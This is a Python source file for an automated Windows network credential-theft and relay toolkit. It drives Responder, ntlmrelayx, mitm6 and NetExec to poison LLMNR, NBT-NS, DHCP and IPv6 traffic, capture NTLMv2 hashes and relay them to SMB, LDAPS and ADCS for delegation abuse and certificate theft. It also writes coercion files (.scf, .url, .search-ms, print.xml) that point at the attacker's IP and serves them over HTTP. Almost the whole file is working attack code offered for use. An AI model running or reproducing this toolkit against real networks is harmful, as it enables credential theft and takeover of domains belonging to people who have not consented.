#!/usr/bin/env python3

import os
import sys
import time
import json
import shutil
import logging
import argparse
import netifaces
from datetime import datetime
from pathlib import Path
from threading import Thread
from termcolor import colored
from subprocess import Popen, PIPE

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class AuditTrail:
    """Track all actions and their results"""
    
    def __init__(self, output_dir):
        self.output_dir = output_dir
        self.audit_file = output_dir / 'audit.json'
        self.events = []
        self.start_time = datetime.now()
        
        # Create initial audit entry
        self.add_event('audit_start', {
            'timestamp': self.start_time.isoformat(),
            'output_dir': str(output_dir)
        })
    
    def add_event(self, event_type, details):
        """Add an event to the audit trail"""
        event = {
            'timestamp': datetime.now().isoformat(),
            'type': event_type,
            'details': details
        }
        self.events.append(event)
        self.save()
        
    def add_command(self, command, success, output=None, error=None):
        """Track command execution"""
        self.add_event('command', {
            'command': command,
            'success': success,
            'output': output,
            'error': error
        })
    
    def add_result(self, result_type, details):
        """Track attack results"""
        self.add_event('result', {
            'result_type': result_type,
            'details': details
        })
    
    def save(self):
        """Save audit trail to file"""
        try:
            audit_data = {
                'start_time': self.start_time.isoformat(),
                'end_time': datetime.now().isoformat(),
                'events': self.events
            }
            self.audit_file.write_text(json.dumps(audit_data, indent=2))
        except Exception as e:
            logger.error(f"Error saving audit trail: {str(e)}")
            logger.exception("Exception occurred")

def check_dependencies():
    """Check if required tools are installed"""
    required_tools = {
        'nxc': 'NetExec (pipx install git+https://github.com/Pennyw0rth/NetExec.git)',
        'impacket-ntlmrelayx': 'Impacket (pipx install git+https://github.com/fortra/impacket.git)',
        'responder': 'Responder (pipx install git+https://github.com/lgandx/Responder.git)',
        'mitm6': 'mitm6 (pipx install mitm6)',
        'certipy': 'Certipy (pipx install git+https://github.com/ly4k/Certipy.git)'
    }
    
    missing_tools = []
    for tool, install_info in required_tools.items():
        if not shutil.which(tool):
            missing_tools.append(f"{tool} - {install_info}")
    
    if missing_tools:
        print(colored("\nMissing required tools:", 'red'))
        for tool in missing_tools:
            print(colored(f"[-] {tool}", 'red'))
        print("\nPlease run the install script before continuing.")
        sys.exit(1)

class CoerceTemplates:
    """Templates for authentication coercion"""
    
    SEARCH_MS = """<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
<description>Microsoft Outlook</description>
<isSearchOnlyItem>false</isSearchOnlyItem>
<includeInStartMenuScope>true</includeInStartMenuScope>
<iconReference>imageres.dll,-1002</iconReference>
<folderType>{{91475FE5-586B-4EBA-8D75-D17434B8CDF6}}</folderType>
<simpleLocation>
<url>\\\\{server}\\share\\</url>
</simpleLocation>
</searchConnectorDescription>"""

    SCF = """[Shell]
Command=2
IconFile=\\\\{server}\\share\\icon.ico
[Taskbar]
Command=ToggleDesktop"""

    URL = """[InternetShortcut]
URL=file://{server}/share/
IconFile=\\\\{server}\\share\\icon.ico
IconIndex=1"""

    PRINT = """<?xml version="1.0" encoding="UTF-8"?>
<descendantfonts>
<print>
<properties xmlns="http://schemas.microsoft.com/windows/2006/propertiesschema">
<property name="System.ItemNameDisplay">\\\\{server}\\share\\file</property>
</properties>
</print>
</descendantfonts>"""

class CredentialToolkit:
    def __init__(self, args):
        self.args = args
        self.iface = args.interface or self.get_default_interface()
        self.local_ip = self.get_local_ip(self.iface)
        self.processes = []
        self.templates = CoerceTemplates()
        self.http_server = None
        
        # Setup output and audit
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        self.output_dir = Path('output') / timestamp
        self.setup_output_directory()
        self.audit = AuditTrail(self.output_dir)
        
        # Log initialization
        self.setup_logging()
        
    def setup_logging(self):
        """Setup file logging"""
        log_file = self.output_dir / 'toolkit.log'
        file_handler = logging.FileHandler(log_file)
        file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
        logger.addHandler(file_handler)
        
    def setup_output_directory(self):
        """Setup output directory structure"""
        try:
            # Create main output directory
            self.output_dir.mkdir(parents=True, exist_ok=True)
            
            # Create subdirectories
            (self.output_dir / 'hashes').mkdir(exist_ok=True)
            (self.output_dir / 'relay').mkdir(exist_ok=True)
            (self.output_dir / 'adcs').mkdir(exist_ok=True)
            (self.output_dir / 'logs').mkdir(exist_ok=True)
            
            # Symlink Responder logs
            responder_logs = Path('/usr/share/responder/logs')
            if responder_logs.exists():
                os.symlink(responder_logs, self.output_dir / 'responder')
                
            return True
            
        except Exception as e:
            self.print_bad(f"Error setting up output directory: {str(e)}")
            logger.error(f"Error setting up output directory: {str(e)}")
            return False

    def get_default_interface(self):
        """Get default network interface"""
        return netifaces.gateways()['default'][netifaces.AF_INET][1]

    def get_local_ip(self, iface):
        """Get local IP address"""
        return netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']

    def setup_coercion_files(self):
        """Generate authentication coercion files"""
        try:
            web_dir = Path('web')
            web_dir.mkdir(exist_ok=True)
            
            files = {
                'search.search-ms': self.templates.SEARCH_MS,
                'share.scf': self.templates.SCF,
                'share.url': self.templates.URL,
                'print.xml': self.templates.PRINT
            }
            
            for filename, template in files.items():
                try:
                    content = template.format(server=self.local_ip)
                    (web_dir / filename).write_text(content)
                    self.audit.add_event('file_created', {
                        'file': str(web_dir / filename),
                        'type': 'coercion'
                    })
                except Exception as e:
                    self.print_bad(f"Error creating {filename}: {str(e)}")
                    continue
            
            self.print_good(f"Generated coercion files in {web_dir}")
            return True
        except Exception as e:
            self.print_bad(f"Error in setup_coercion_files: {str(e)}")
            return False

    def find_relay_targets(self):
        """Find potential relay targets (SMB signing disabled)"""
        try:
            self.print_info("Finding relay targets...")
            cmd = f"nxc smb {self.args.target_range} --gen-relay-list targets.txt"
            proc = self.run_command(cmd)
            proc.wait()
            
            if Path('targets.txt').exists():
                # Copy targets file to output directory
                shutil.copy('targets.txt', self.output_dir / 'relay' / 'targets.txt')
                self.audit.add_event('targets_found', {
                    'range': self.args.target_range,
                    'file': str(self.output_dir / 'relay' / 'targets.txt')
                })
                return True
            return False
        except Exception as e:
            self.print_bad(f"Error finding relay targets: {str(e)}")
            return False

    def edit_responder_conf(self):
        """Configure Responder settings"""
        try:
            conf_path = Path('/usr/share/responder/Responder.conf')
            if not conf_path.exists():
                self.print_bad("Responder.conf not found")
                return False
                
            content = conf_path.read_text()
            protocols = ['HTTP', 'SMB'] if self.args.relay else []
            for proto in protocols:
                content = content.replace(f"{proto} = On", f"{proto} = Off")
            
            conf_path.write_text(content)
            if protocols:
                self.print_good(f"Disabled protocols in Responder.conf: {', '.join(protocols)}")
                self.audit.add_event('responder_config', {
                    'disabled_protocols': protocols
                })
            return True
        except Exception as e:
            self.print_bad(f"Error editing Responder.conf: {str(e)}")
            return False

    def monitor_responder_logs(self):
        """Monitor Responder logs for new hashes"""
        responder_dir = Path('/usr/share/responder/logs')
        if not responder_dir.exists():
            return
            
        initial_files = set(responder_dir.glob('*-NTLMv2-*.txt'))
        
        while True:
            time.sleep(5)
            current_files = set(responder_dir.glob('*-NTLMv2-*.txt'))
            new_files = current_files - initial_files
            
            for f in new_files:
                hash_content = f.read_text()
                self.audit.add_result('hash_captured', {
                    'file': str(f),
                    'hash': hash_content
                })
                # Copy hash file to output directory
                shutil.copy(f, self.output_dir / 'hashes')
                initial_files.add(f)

    def start_responder(self):
        """Start Responder for hash capture"""
        try:
            cmd = f'responder -I {self.iface} -wv'
            if self.args.analyze:
                cmd += ' -A'
            if self.args.challenge:
                cmd += f' --lm --disable-ess'
            if self.args.dhcp:
                cmd += ' -d'
                
            proc = self.run_command(cmd)
            self.audit.add_event('responder_started', {
                'command': cmd,
                'pid': proc.pid if proc else None
            })
            
            # Start log monitoring in background
            Thread(target=self.monitor_responder_logs, daemon=True).start()
            
            return proc
        except Exception as e:
            self.print_bad(f"Error starting Responder: {str(e)}")
            return None

    def start_ntlmrelay(self):
        """Start ntlmrelayx with appropriate options"""
        try:
            if not self.args.relay:
                return None
                
            options = [
                '-tf', 'targets.txt',
                '-smb2support',
                '-l', str(self.output_dir / 'relay'),
                '-of', str(self.output_dir / 'relay' / 'ntlmrelay.log')
            ]

            if self.args.socks:
                options.append('-socks')
            
            if self.args.relay_type:
                if self.args.relay_type == 'ldaps':
                    options.extend(['-t', f'ldaps://{self.args.dc_ip}', '--delegate-access'])
                elif self.args.relay_type == 'smb':
                    options.extend(['--no-http-server', '--no-smb-server'])
                elif self.args.relay_type == 'adcs':
                    options.extend(['-t', f'http://{self.args.dc_ip}/certsrv/certfnsh.asp'])

            cmd = f'impacket-ntlmrelayx {" ".join(options)}'
            proc = self.run_command(cmd)
            self.audit.add_event('ntlmrelay_started', {
                'command': cmd,
                'pid': proc.pid if proc else None,
                'type': self.args.relay_type
            })
            return proc
        except Exception as e:
            self.print_bad(f"Error starting NTLM relay: {str(e)}")
            return None

    def start_mitm6(self):
        """Start mitm6 for IPv6 poisoning"""
        try:
            if not self.args.ipv6 or not self.args.domain:
                return None
                
            cmd = f'mitm6 -d {self.args.domain} -i {self.iface}'
            proc = self.run_command(cmd)
            self.audit.add_event('mitm6_started', {
                'command': cmd,
                'pid': proc.pid if proc else None,
                'domain': self.args.domain
            })
            return proc
        except Exception as e:
            self.print_bad(f"Error starting mitm6: {str(e)}")
            return None

    def start_http_server(self):
        """Start HTTP server for coercion files"""
        try:
            web_dir = Path('web')
            if not web_dir.exists():
                self.print_bad("Web directory not found")
                return None

            os.chdir(str(web_dir))
            from http.server import HTTPServer, SimpleHTTPRequestHandler
            
            class AuditingHandler(SimpleHTTPRequestHandler):
                def do_GET(self):
                    self.server.toolkit.audit.add_event('http_request', {
                        'path': self.path,
                        'client': self.client_address[0]
                    })
                    return super().do_GET()
            
            server = HTTPServer(("", self.args.port), AuditingHandler)
            server.toolkit = self  # Pass reference to toolkit for auditing
# part 2
            server_thread = Thread(target=server.serve_forever)
            server_thread.daemon = True
            server_thread.start()
            
            self.print_good(f"Started HTTP server on port {self.args.port}")
            self.audit.add_event('http_server_started', {
                'port': self.args.port,
                'directory': str(web_dir)
            })
            return server
        except Exception as e:
            self.print_bad(f"Error starting HTTP server: {str(e)}")
            return None

    def run_command(self, cmd):
        """Execute command and return process"""
        try:
            logger.debug(f"Running command: {cmd}")
            proc = Popen(cmd.split(), stdout=PIPE, stderr=PIPE)
            self.processes.append(proc)
            
            # Start output monitoring thread
            def monitor_output(proc):
                while True:
                    output = proc.stdout.readline()
                    if not output and proc.poll() is not None:
                        break
                    if output:
                        logger.info(output.strip().decode())
                        self.audit.add_event('command_output', {
                            'pid': proc.pid,
                            'output': output.strip().decode()
                        })
            
            Thread(target=monitor_output, args=(proc,), daemon=True).start()
            return proc
        except Exception as e:
            self.print_bad(f"Error running command '{cmd}': {str(e)}")
            return None

    def generate_report(self):
        """Generate HTML report of attack results"""
        report_file = self.output_dir / 'report.html'
        
        # Basic HTML template
        html = f"""
        <html>
        <head>
            <title>Attack Report - {time.strftime("%Y-%m-%d %H:%M:%S")}</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 40px; }}
                .section {{ margin: 20px 0; padding: 10px; border: 1px solid #ccc; }}
                .success {{ color: green; }}
                .error {{ color: red; }}
            </style>
        </head>
        <body>
            <h1>Attack Report</h1>
            <div class="section">
                <h2>Environment</h2>
                <p>Interface: {self.iface}</p>
                <p>Local IP: {self.local_ip}</p>
                <p>Target Range: {self.args.target_range}</p>
            </div>
        """
        
        # Add audit trail
        html += """
            <div class="section">
                <h2>Audit Trail</h2>
                <pre>{}</pre>
            </div>
        """.format(json.dumps(self.audit.events, indent=2))
        
        # Add results summary
        html += """
            <div class="section">
                <h2>Results Summary</h2>
        """
        
        # Check Responder logs
        responder_dir = self.output_dir / 'responder'
        if responder_dir.exists():
            hash_files = list(responder_dir.glob('*-NTLMv2-*.txt'))
            if hash_files:
                html += f"<p class='success'>Captured {len(hash_files)} NTLMv2 hashes</p>"
                
        # Check relay results
        relay_dir = self.output_dir / 'relay'
        if relay_dir.exists():
            relay_log = relay_dir / 'ntlmrelay.log'
            if relay_log.exists():
                html += f"<p>Relay Results:</p><pre>{relay_log.read_text()}</pre>"
        
        html += """
            </div>
        </body>
        </html>
        """
        
        report_file.write_text(html)
        self.print_good(f"Generated report: {report_file}")

    def auto_attack(self):
        """Run automated attack sequence"""
        try:
            self.print_info("Starting automated attack sequence...")
            self.audit.add_event('attack_started', {
                'mode': 'auto',
                'interface': self.iface,
                'target_range': self.args.target_range
            })
            
            # 1. Initial recon
            self.print_info("Phase 1: Initial Reconnaissance")
            
            # Check for broadcast protocols
            self.print_info("Checking for broadcast protocols (LLMNR/NBT-NS)...")
            analyze_proc = self.run_command(f'responder -I {self.iface} -A')
            time.sleep(10)
            analyze_proc.terminate()
            
            # Find potential relay targets
            self.print_info("Scanning for relay targets...")
            targets_found = self.find_relay_targets()
            
            if targets_found:
                self.print_good("Found potential relay targets")
            else:
                self.print_bad("No relay targets found")

            # Check for ADCS web endpoints
            if self.args.dc_ip:
                self.print_info("Checking for ADCS...")
                adcs_proc = self.run_command(f'nxc ldap {self.args.dc_ip} -M adcs')
                adcs_proc.wait()
            
            # 2. Setup attack infrastructure
            self.print_info("Phase 2: Setting Up Attack Infrastructure")
            
            # Configure Responder
            if not self.edit_responder_conf():
                return
                
            # Setup coercion files
            if not self.setup_coercion_files():
                return

            # Start HTTP server
            self.http_server = self.start_http_server()
            if not self.http_server:
                return
            
            # 3. Start core services
            self.print_info("Phase 3: Starting Core Services")
            responder = self.start_responder()
            
            # 4. Start relay attacks if targets found
            if targets_found:
                self.print_info("Phase 4: Starting Relay Attacks")
                
                # SMB relay with SOCKS
                ntlmrelay_smb = self.start_ntlmrelay()
                logger.info("Started SMB relay with SOCKS")
                
                if self.args.dc_ip:
                    # LDAPS relay for delegation
                    ntlmrelay_ldaps = self.run_command(
                        f'impacket-ntlmrelayx -t ldaps://{self.args.dc_ip} --delegate-access'
                    )
                    logger.info("Started LDAPS relay for delegation")
                    
                    # ADCS relay
                    ntlmrelay_adcs = self.run_command(
                        f'impacket-ntlmrelayx -t http://{self.args.dc_ip}/certsrv/certfnsh.asp'
                    )
                    logger.info("Started ADCS relay")
            else:
                logger.warning("No relay targets found. Skipping relay attacks.")
            
            # 5. Start IPv6 attack if domain specified and IPv6 attacks enabled
            if self.args.domain and self.args.ipv6:
                self.print_info("Phase 5: Starting IPv6 Attack")
                mitm6_proc = self.start_mitm6()
                
                if self.args.dc_ip:
                    # Additional LDAPS relay specifically for mitm6
                    ntlmrelay_mitm6 = self.run_command(
                        f'impacket-ntlmrelayx -t ldaps://{self.args.dc_ip} --delegate-access --add-computer'
                    )
                    logger.info("Started LDAPS relay for mitm6")
            
            self.print_info("Attack infrastructure deployed - Monitoring for captures/relays")
            self.print_info(f"Coercion files available at: http://{self.local_ip}:{self.args.port}/")
            
            # Print attack summary
            self.print_info("\nActive Attack Channels:")
            self.print_info("- NetBIOS/LLMNR Poisoning")
            if targets_found:
                self.print_info("- SMB Relay with SOCKS")
                if self.args.dc_ip:
                    self.print_info("- LDAPS Delegation Attack")
                    self.print_info("- ADCS Certificate Attack")
            if self.args.domain and self.args.ipv6:
                self.print_info("- IPv6 DNS Takeover")
            
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                self.print_info('\nStopping attack sequence...')
            finally:
                self.cleanup()
                
        except Exception as e:
            self.print_bad(f"Error in auto_attack: {str(e)}")
            logger.exception("Exception occurred in auto_attack")
            self.audit.add_event('error', {
                'phase': 'auto_attack',
                'error': str(e)
            })
        finally:
            self.cleanup()

    def cleanup(self):
        """Cleanup processes and files"""
        try:
            for proc in self.processes:
                try:
                    proc.terminate()
                    proc.wait(timeout=2)
                except:
                    proc.kill()

            if self.http_server:
                self.http_server.shutdown()

            # Generate final report
            self.generate_report()
            
            # Final audit entry
            self.audit.add_event('attack_completed', {
                'output_dir': str(self.output_dir),
                'report': str(self.output_dir / 'report.html')
            })

        except Exception as e:
            self.print_bad(f"Error in cleanup: {str(e)}")

    def print_bad(self, msg): print(colored('[-] ', 'red') + msg)
    def print_info(self, msg): print(colored('[*] ', 'blue') + msg)
    def print_good(self, msg): print(colored('[+] ', 'green') + msg)

def parse_args():
    parser = argparse.ArgumentParser(description="Credential Collection and Relay Toolkit")
    parser.add_argument("-i", "--interface", help="Network interface to use")
    parser.add_argument("-p", "--port", type=int, default=8080, help="HTTP server port (default: 8080)")
    
    # Attack targets
    parser.add_argument("-dc", "--dc-ip", help="Domain controller IP")
    parser.add_argument("-d", "--domain", help="Domain name for IPv6/WPAD attacks")
    parser.add_argument("-tr", "--target-range", default="192.168.1.0/24", help="Target range for relay discovery")
    
    # Collection options
    parser.add_argument("-a", "--analyze", action="store_true", help="Run in analyze mode")
    parser.add_argument("-c", "--challenge", help="Custom NTLM challenge for downgrade attacks")
    parser.add_argument("--dhcp", action="store_true", help="Enable DHCP poisoning")
    
    # Relay options
    parser.add_argument("-r", "--relay", action="store_true", help="Enable NTLM relay")
    parser.add_argument("-rt", "--relay-type", choices=['smb', 'ldaps', 'adcs'], help="Relay protocol type")
    parser.add_argument("-s", "--socks", action="store_true", help="Enable SOCKS proxy")
    
    # Attack modes
    parser.add_argument("--auto", action="store_true", help="Enable automated attack sequence")
    parser.add_argument("--ipv6", action="store_true", help="Enable IPv6 attacks")
    
    return parser

def main():
    if os.geteuid():
        print(colored('[-] ', 'red') + 'Script must run as root')
        sys.exit(1)
        
    check_dependencies()
    
    parser = parse_args()
    args = parser.parse_args()
    toolkit = CredentialToolkit(args)

    if args.auto:
        toolkit.auto_attack()
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
